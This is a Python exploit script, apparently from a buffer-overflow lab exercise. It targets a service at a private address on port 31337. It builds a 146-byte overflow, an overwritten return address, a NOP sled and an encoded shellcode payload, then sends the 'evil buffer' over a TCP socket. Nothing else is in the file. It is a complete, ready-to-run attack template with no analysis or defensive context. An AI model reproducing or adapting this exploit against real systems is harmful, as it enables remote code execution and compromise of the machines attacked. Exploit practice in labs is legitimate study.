import socket

ip = "192.168.56.102"
port = 31337
prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 32
payload = ("\xdd\xc0\xd9\x74\x24\xf4\x5b\xba\xc3\x9e\x13\xb9\x33\xc9\xb1"
"\x53\x31\x53\x17\x83\xeb\xfc\x03\x90\x8d\xf1\x4c\xea\x5a\x77"
"\xae\x12\x9b\x18\x26\xf7\xaa\x18\x5c\x7c\x9c\xa8\x16\xd0\x11"
"\x42\x7a\xc0\xa2\x26\x53\xe7\x03\x8c\x85\xc6\x94\xbd\xf6\x49"
"\x17\xbc\x2a\xa9\x26\x0f\x3f\xa8\x6f\x72\xb2\xf8\x38\xf8\x61"
"\xec\x4d\xb4\xb9\x87\x1e\x58\xba\x74\xd6\x5b\xeb\x2b\x6c\x02"
"\x2b\xca\xa1\x3e\x62\xd4\xa6\x7b\x3c\x6f\x1c\xf7\xbf\xb9\x6c"
"\xf8\x6c\x84\x40\x0b\x6c\xc1\x67\xf4\x1b\x3b\x94\x89\x1b\xf8"
"\xe6\x55\xa9\x1a\x40\x1d\x09\xc6\x70\xf2\xcc\x8d\x7f\xbf\x9b"
"\xc9\x63\x3e\x4f\x62\x9f\xcb\x6e\xa4\x29\x8f\x54\x60\x71\x4b"
"\xf4\x31\xdf\x3a\x09\x21\x80\xe3\xaf\x2a\x2d\xf7\xdd\x71\x3a"
"\x34\xec\x89\xba\x52\x67\xfa\x88\xfd\xd3\x94\xa0\x76\xfa\x63"
"\xc6\xac\xba\xfb\x39\x4f\xbb\xd2\xfd\x1b\xeb\x4c\xd7\x23\x60"
"\x8c\xd8\xf1\x1d\x84\x7f\xaa\x03\x69\x3f\x1a\x84\xc1\xa8\x70"
"\x0b\x3e\xc8\x7a\xc1\x57\x61\x87\xea\x52\x4b\x0e\x0c\x36\xbb"
"\x46\x86\xae\x79\xbd\x1f\x49\x81\x97\x37\xfd\xca\xf1\x80\x02"
"\xcb\xd7\xa6\x94\x40\x34\x73\x85\x56\x11\xd3\xd2\xc1\xef\xb2"
"\x91\x70\xef\x9e\x41\x10\x62\x45\x91\x5f\x9f\xd2\xc6\x08\x51"
"\x2b\x82\xa4\xc8\x85\xb0\x34\x8c\xee\x70\xe3\x6d\xf0\x79\x66"
"\xc9\xd6\x69\xbe\xd2\x52\xdd\x6e\x85\x0c\x8b\xc8\x7f\xff\x65"
"\x83\x2c\xa9\xe1\x52\x1f\x6a\x77\x5b\x4a\x1c\x97\xea\x23\x59"
"\xa8\xc3\xa3\x6d\xd1\x39\x54\x91\x08\xfa\x74\x70\x98\xf7\x1c"
"\x2d\x49\xba\x40\xce\xa4\xf9\x7c\x4d\x4c\x82\x7a\x4d\x25\x87"
"\xc7\xc9\xd6\xf5\x58\xbc\xd8\xaa\x59\x95")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
